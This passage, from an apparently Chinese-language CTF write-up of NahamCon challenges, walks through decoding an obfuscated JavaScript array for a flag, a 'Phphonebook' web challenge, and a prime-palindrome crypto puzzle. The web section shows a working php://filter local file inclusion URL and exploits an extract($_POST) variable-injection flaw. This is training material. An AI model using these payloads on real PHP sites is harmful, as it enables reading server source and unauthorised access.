t;\x69\x6D\x67&quot;,&quot;\x66\x69\x6C\x74\x65\x72&quot;,&quot;\x6C\x6F\x61\x64\x69\x6E\x67\x48\x74\x6D\x6C&quot;,&quot;\x6C\x65\x6E\x67\x74\x68&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x22\x20\x2F\x3E&quot;,&quot;\x77\x72\x61\x70\x41\x6C\x6C&quot;,&quot;\x63\x6F\x6E\x74\x65\x6E\x74\x73&quot;,&quot;\x70\x61\x67\x69\x6E\x67\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x68\x69\x64\x65&quot;,&quot;\x63\x6C\x6F\x73\x65\x73\x74&quot;,&quot;\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x61\x64\x64\x43\x6C\x61\x73\x73&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x2C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x6E\x6F\x74&quot;,&quot;\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74\x22\x20\x2F\x3E&quot;,&quot;\x77\x72\x61\x70&quot;,&quot;\x75\x6E\x77\x72\x61\x70&quot;,&quot;\x63\x68\x69\x6C\x64\x72\x65\x6E&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x72\x65\x6D\x6F\x76\x65\x44\x61\x74\x61&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x75\x6E\x62\x69\x6E\x64&quot;,&quot;\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72&quot;,&quot;\x62\x6F\x72\x64\x65\x72\x54\x6F\x70\x57\x69\x64\x74\x68&quot;,&quot;\x70\x61\x64\x64\x69\x6E\x67\x54\x6F\x70&quot;,&quot;\x73\x63\x72\x6F\x6C\x6C\x54\x6F\x70&quot;,&quot;\x74\x6F\x70&quot;,&quot;\x6F\x66\x66\x73\x65\x74&quot;,&quot;\x68\x65\x69\x67\x68\x74&quot;,&quot;\x63\x65\x69\x6C&quot;,&quot;\x77\x61\x69\x74\x69\x6E\x67&quot;,&quot;\x70\x61\x64\x64\x69\x6E\x67&quot;,&quot;\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74&quot;,&quot;\x69\x6E\x66\x6F&quot;,&quot;\x6A\x53\x63\x72\x6F\x6C\x6C\x3A&quot;,&quot;\x66\x72\x6F\x6D\x20\x62\x6F\x74\x74\x6F\x6D\x2E\x20\x4C\x6F\x61\x64\x69\x6E\x67\x20\x6E\x65\x78\x74\x20\x72\x65\x71\x75\x65\x73\x74\x2E\x2E\x2E&quot;,&quot;\x6E\x65\x78\x74\x48\x72\x65\x66&quot;,&quot;\x77\x61\x72\x6E&quot;,&quot;\x6A\x53\x63\x72\x6F\x6C\x6C\x3A\x20\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72\x20\x6E\x6F\x74\x20\x66\x6F\x75\x6E\x64\x20\x2D\x20\x64\x65\x73\x74\x72\x6F\x79\x69\x6E\x67&quot;,&quot;\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72&quot;,&quot;\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72\x55\x6E\x74\x69\x6C&quot;,&quot;\x73\x63\x72\x6F\x6C\x6C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x62\x69\x6E\x64&quot;,&quot;\x63\x6C\x69\x63\x6B\x2E\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E&quot;,&quot;\x3C\x2F\x64\x69\x76\x3E&quot;,&quot;\x68\x74\x6D\x6C&quot;,&quot;\x6C\x61\x73\x74&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64\x22\x20\x2F\x3E&quot;,&quot;\x61\x70\x70\x65\x6E\x64&quot;,&quot;\x65\x72\x72\x6F\x72&quot;,&quot;\x72\x65\x6D\x6F\x76\x65&quot;,&quot;\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74&quot;,&quot;\x63\x61\x6C\x6C\x62\x61\x63\x6B&quot;,&quot;\x63\x61\x6C\x6C&quot;,&quot;\x64\x69\x72&quot;,&quot;\x6C\x6F\x61\x64&quot;,&quot;\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64&quot;,&quot;\x61\x6E\x69\x6D\x61\x74\x65&quot;,&quot;\x64\x65\x62\x75\x67&quot;,&quot;\x6F\x62\x6A\x65\x63\x74&quot;,&quot;\x61\x70\x70\x6C\x79&quot;,&quot;\x6C\x6F\x67&quot;,&quot;\x73\x6C\x69\x63\x65&quot;,&quot;\x70\x72\x6F\x74\x6F\x74\x79\x70\x65&quot;,&quot;\x66\x6E&quot;,&quot;\x69\x6E\x69\x74\x69\x61\x6C\x69\x7A\x65\x64&quot;,&quot;\x65\x61\x63\x68&quot;];</span><br></pre></td></tr></table></figure><p>转为utf-8得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;use strict&#39;, &#39;jscroll&#39;, &#39;&lt;small&gt;Loading...&lt;&#x2F;small&gt;&#39;, &#39;a:last&#39;, &#39;&#39;, &#39;flag&#39;, &#39;SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9&#39;, &#39;setItem&#39;, &#39;localStorage&#39;, &#39;data&#39;, &#39;function&#39;, &#39;defaults&#39;, &#39;extend&#39;, &#39;overflow-y&#39;, &#39;css&#39;, &#39;visible&#39;, &#39;first&#39;, &#39;nextSelector&#39;, &#39;find&#39;, &#39;body&#39;, &#39;href&#39;, &#39;attr&#39;, &#39; &#39;, &#39;contentSelector&#39;, &#39;trim&#39;, &#39;src&#39;, &#39;img&#39;, &#39;filter&#39;, &#39;loadingHtml&#39;, &#39;length&#39;, &#39;.jscroll-inner&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-inner&quot; &#x2F;&gt;&#39;, &#39;wrapAll&#39;, &#39;contents&#39;, &#39;pagingSelector&#39;, &#39;hide&#39;, &#39;closest&#39;, &#39;jscroll-next-parent&#39;, &#39;addClass&#39;, &#39;.jscroll-inner,.jscroll-added&#39;, &#39;not&#39;, &#39;parent&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-next-parent&quot; &#x2F;&gt;&#39;, &#39;wrap&#39;, &#39;unwrap&#39;, &#39;children&#39;, &#39;.jscroll-added&#39;, &#39;removeData&#39;, &#39;.jscroll&#39;, &#39;unbind&#39;, &#39;div.jscroll-inner&#39;, &#39;borderTopWidth&#39;, &#39;paddingTop&#39;, &#39;scrollTop&#39;, &#39;top&#39;, &#39;offset&#39;, &#39;height&#39;, &#39;ceil&#39;, &#39;waiting&#39;, &#39;padding&#39;, &#39;outerHeight&#39;, &#39;info&#39;, &#39;jScroll:&#39;, &#39;from bottom. Loading next request...&#39;, &#39;nextHref&#39;, &#39;warn&#39;, &#39;jScroll: nextSelector not found - destroying&#39;, &#39;autoTrigger&#39;, &#39;autoTriggerUntil&#39;, &#39;scroll.jscroll&#39;, &#39;bind&#39;, &#39;click.jscroll&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-loading&quot;&gt;&#39;, &#39;&lt;&#x2F;div&gt;&#39;, &#39;html&#39;, &#39;last&#39;, &#39;&lt;div class&#x3D;&quot;jscroll-added&quot; &#x2F;&gt;&#39;, &#39;append&#39;, &#39;error&#39;, &#39;remove&#39;, &#39;.jscroll-next-parent&#39;, &#39;callback&#39;, &#39;call&#39;, &#39;dir&#39;, &#39;load&#39;, &#39;div.jscroll-added&#39;, &#39;animate&#39;, &#39;debug&#39;, &#39;object&#39;, &#39;apply&#39;, &#39;log&#39;, &#39;slice&#39;, &#39;prototype&#39;, &#39;fn&#39;, &#39;initialized&#39;, &#39;each&#39;]</span><br></pre></td></tr></table></figure><p>将flag 进行base64解密：JCTF{spoooooky_ghosts_in_storage}</p><h3 id="Phphonebook"><a href="#Phphonebook" class="headerlink" title="Phphonebook"></a>Phphonebook</h3><p>进入题目发现疑有文件包含漏洞，</p><p>构造: <a href="http://jh2i.com:50002/?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://jh2i.com:50002/?file=php://filter/read=convert.base64-encode/resource=index.php</a> 得到index.php源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Phphonebook<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"main.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Sorry! You are in /index.php/?file="</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(str_replace(<span class="string">'.php'</span>,<span class="string">''</span>,$_GET[<span class="string">'file'</span>]).<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>The phonebook is located at <span class="tag">&lt;<span class="name">code</span>&gt;</span>phphonebook.php<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position:fixed; bottom:1%; left:1%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span> NOT CHALLENGE RELATED:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">600px</span> <span class="attr">src</span>=<span class="string">"https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现有waf ，file提交的参数里‘.php’会被过滤，并在末尾强制加上‘.php’.</p><p>同时发现phphonebook.php。同样用文件包含得到源码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Phphonebook&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class&#x3D;&quot;bg&quot;&gt;</span><br><span class="line">    &lt;h1 id&#x3D;&quot;header&quot;&gt; Welcome to the Phphonebook &lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;im_container&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;img src&#x3D;&quot;book.jpg&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;30%&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;p class&#x3D;&quot;desc&quot;&gt;</span><br><span class="line">      This phphonebook was made to look up all sorts of numbers! Have fun...</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">        &lt;label id&#x3D;&quot;form_label&quot;&gt;Enter number: &lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;number&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">      &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;php_container&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      extract($_POST);</span><br><span class="line"></span><br><span class="line">    if (isset($emergency))&#123;</span><br><span class="line">    echo(file_get_contents(&quot;&#x2F;flag.txt&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;position:fixed; bottom:1%; left:1%;&quot;&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;b&gt; NOT CHALLENGE RELATED:&lt;&#x2F;b&gt;&lt;br&gt;THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;img width&#x3D;600px src&#x3D;&quot;https:&#x2F;&#x2F;d24wuq6o951i2g.cloudfront.net&#x2F;img&#x2F;events&#x2F;id&#x2F;457&#x2F;457748121&#x2F;assets&#x2F;f7da0d718eb77c83f5cb6221a06a2f45.inti.png&quot;&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>发现只要以post提交了emergency变量就可以得到flag</p><p><img src="image-20200616001450290.png" alt="image-20200616001450290"></p><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="Homecooked"><a href="#Homecooked" class="headerlink" title="Homecooked"></a>Homecooked</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">cipher_b64 = <span class="string">b"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</span><br><span class="line">            <span class="keyword">if</span> (num % i) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(num)</span>:</span></span><br><span class="line">    my_str = str(num)</span><br><span class="line">    rev_str = reversed(my_str)</span><br><span class="line">    <span class="keyword">if</span> list(my_str) == list(rev_str):</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(cipher_b64).decode().split(<span class="string">","</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count &lt; len(cipher)):</span><br><span class="line">    <span class="keyword">if</span> (a(num)):</span><br><span class="line">        <span class="keyword">if</span> (b(num)):</span><br><span class="line">            print(chr(int(cipher[count]) ^ num), end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">13</span>):</span><br><span class="line">                num = <span class="number">50000</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">26</span>):</span><br><span class="line">                num = <span class="number">500000</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p>粗略审计mian代码了解大概函数流程：当a()与b()返回结果为True 时（函数a的作用是判num是否为质数，函数b的作用是判断num是否为回数。），输出cipher[count]与num相与的字符串。且在才count==13时num陡然变为5000 在count==26时num陡然变为50000。</p><p>cipher_b64 经过解密分析cipher为一个字符串列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher&#x3D;[100,111,100,96,112,21,209,166,216,140,330,318,321,70221,70414,70544,71414,71810,72211,72827,73000,73319,73722,74088,74643,75542,1002903,1008094,1022089,1028104,1035337,1043448,1055587,1062541,1065715,1074749,1082844,1085696,1092966,1094000]</span><br></pre></td></tr></table></figure><p>发现cipher刚好在第13个元素后及第26后元素大小突然猛增。</p><p>因此推测这是一个解密脚本，而flag应该是print输出的结果。按道理直接运行就可以得flag。</p><p>于执行代码：</p><p><img src="image-20200616093343738.png" alt="image-20200616093343738"></p><p>发现果然运行就可以得flag，但flag分三部分给，第二部分给的慢，第三部分更慢。</p><p>推测是考点 因该是提高解密脚本效率</p><p>仔细审计代码,发现函数a</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</span><br><span class="line">            <span class="keyword">if</span> (num % i) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这个代码的时间复杂度为N。有很大的优化空间。</p><h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p><strong>根据数论，如果X不能被2到根号X之间的任一整数整除,则不是质数。</strong></p><p>我们可以优化函数a为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">             <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这样下来函数a的空间效率只有√N。</p><h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p><strong>偶数中除了2都不是质数，且奇数的因数也没有偶数</strong>，因此可以进一步优化a函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">     <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">elif</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这样来函数a的空间效率只有√N/2。</p><h4 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h4><p>利用<strong>6N±1素数筛选法</strong>任何一个自然数，总可以表示成如下形式之一：</p><p>6N,6N+1,6N+2,6N+3,6N+4,6N+5 (N=0,1,2,3,..),显然，当N≥1时，6N，6N+2,6N+3,6N+4都不是素数，只有形如6N+1和6N+5的自然数才可能是素数，所以除了2，3外，所有的素数都可以表示成6N±1的形式(N=0,1,2,3,..)，根据上述分析可以构造一面筛子，只对形如6N±1的自然数进行筛选，来减少筛选的次数。故可以修改a函数为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">2</span>) <span class="keyword">or</span> (num == <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> (num % <span class="number">6</span> != <span class="number">1</span>) <span class="keyword">and</span> (num % <span class="number">6</span> != <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (num % i == <span class="number">0</span>) <span class="keyword">or</span> (num % (i + <span class="number">2</span>) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span 